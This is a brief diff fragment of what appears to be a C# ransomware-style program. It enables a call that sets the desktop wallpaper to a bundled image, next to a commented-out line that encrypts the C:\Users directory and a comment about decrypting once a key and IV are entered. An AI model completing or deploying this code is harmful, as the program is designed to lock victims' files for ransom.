@@ -22,7 +22,7 @@
             //encryptor.EncryptDirectory(@"C:\Users");
 
             // Sets desktop background to specifc image
-            //Utils.SetDesktopBackground(@"C:\Users\Programming\Desktop\Background.jpg");
+            Utils.SetDesktopBackground("DesktopBG.jpg");
 
             /* 
              * Starts decryption prcoess after correct key and iv are entered
